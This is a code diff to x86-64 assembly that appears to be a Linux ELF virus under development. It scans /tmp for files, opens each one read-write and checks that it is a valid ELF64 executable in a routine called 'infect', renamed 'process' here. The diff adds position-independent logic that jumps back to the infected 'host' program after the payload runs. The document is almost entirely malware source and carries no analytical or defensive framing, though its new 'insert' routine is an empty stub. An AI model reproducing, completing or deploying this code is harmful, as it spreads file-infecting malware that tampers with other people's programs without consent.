@@ -24,7 +24,7 @@ puts:           call        strlen
                 syscall
                 ret
 
-host:           lea         rdi, [rel hello]
+_host:          lea         rdi, [rel hello]
                 call        puts
 
                 xor         rdi, rdi
@@ -36,6 +36,18 @@ hello           db          "hello world",33,10,0
 
 
 _start:
+                mov         rdx, [rel pie_address]
+                mov         rax, [rel entry]
+                test        rdx, rdx
+                jz          .entry_ready
+                call        .delta
+.delta:         pop         rcx
+                sub         rcx, .delta - _start
+                sub         rcx, rdx
+                add         rax, rcx
+.entry_ready:
+                push        rax
+
                 lea         rdi, [rel slash_tmp]
                 mov         rsi, O_RDONLY | O_DIRECTORY
                 mov         rax, __NR_open
@@ -73,7 +85,7 @@ scandir:        mov         rdx, BUF_SIZE
                 jne         .next
 
                 add         rdi, 19                             ; d_name[]
-                call        infect
+                call        process
 
 .next:          mov         rdi, [rel getdents_buf]
                 add         rdi, [rel getdents_idx]
@@ -89,28 +101,10 @@ scandir:        mov         rdx, BUF_SIZE
                 mov         rax, __NR_close
                 syscall
 return:
-                jmp         [rel entry]
+                pop         rax
+                jmp         rax
 
-is_valid_elf64:                                                 ; expecing data in rdi
-                xor         rax, rax                            ; result in rax; 1 = valid
-                cmp         qword [rdi + 8], rax
-                jnz         .return
-                mov         rdx, ELF_SYSV
-                cmp         qword [rdi], rdx
-                jz          .continue
-                mov         rdx, ELF_SYSV
-                cmp         qword [rdi], rdx
-                jnz         .return
-.continue:      mov         rdx, ELF64_ET_DYN
-                cmp         qword [rdi + 16], rdx
-                jz          .ok
-                mov         rdx, ELF64_ET_EXEC
-                cmp         qword [rdi + 16], rdx
-                jnz         .return
-.ok:            inc         rax
-.return:        ret
-
-infect:                                                         ; expecting filename in rdi
+process:                                                         ; expecting filename in rdi
                 mov         rsi, O_RDWR
                 mov         rax, __NR_open
                 syscall
@@ -128,7 +122,6 @@ infect:                                                         ; expecting file
 
                 mov         rax, qword [rsp - (256-48)]         ; st_size
                 mov         [rel infect_fsize], rax
-
 
                 xor         r9, r9
                 mov         r8, [rel infect_fd]
@@ -158,6 +151,28 @@ infect:                                                         ; expecting file
                 syscall
 .return:        ret
 
+is_valid_elf64:                                                 ; expecing data in rdi
+                xor         rax, rax                            ; result in rax; 1 = valid
+                cmp         qword [rdi + 8], rax
+                jnz         .return
+                mov         rdx, ELF_SYSV
+                cmp         qword [rdi], rdx
+                jz          .continue
+                mov         rdx, ELF_SYSV
+                cmp         qword [rdi], rdx
+                jnz         .return
+.continue:      mov         rdx, ELF64_ET_DYN
+                cmp         qword [rdi + 16], rdx
+                jz          .ok
+                mov         rdx, ELF64_ET_EXEC
+                cmp         qword [rdi + 16], rdx
+                jnz         .return
+.ok:            inc         rax
+.return:        ret
+
+insert:                                                         ; expecting data in rdi
+
+
 directory_fd    dq          -1
 getdents_buf    dq          -1
 getdents_size   dq          -1
@@ -169,5 +184,6 @@ infect_mem      dq          -1
 
 
 slash_tmp   db "/tmp",0
-entry       dq host
+pie_address dq _start
+entry       dq _host
 _finish     equ $
